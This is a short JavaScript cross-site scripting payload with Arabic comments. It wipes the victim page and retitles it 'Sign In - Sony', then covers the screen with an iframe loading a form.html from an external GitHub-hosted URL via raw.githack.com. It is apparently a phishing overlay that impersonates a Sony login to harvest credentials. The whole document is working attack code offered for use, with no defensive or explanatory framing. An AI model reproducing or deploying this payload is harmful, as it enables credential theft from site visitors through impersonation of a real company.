(function() {
    if (window.XSS_DONE) return;
    window.XSS_DONE = true;

    // مسح الصفحة الأصلية لإيقاف الـ Loop نهائياً
    document.documentElement.innerHTML = '<title>Sign In - Sony</title><body style="margin:0;background:#f4f4f4;"></body>';

    var frame = document.createElement('iframe');
    // استخدم رابط Githack لملف form.html الخاص بك
    frame.src = 'https://raw.githack.com/ItsS4LEH/sony/refs/heads/main/form.html';
    frame.style = "position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999;";
    
    document.body.appendChild(frame);
    window.stop(); 
})();
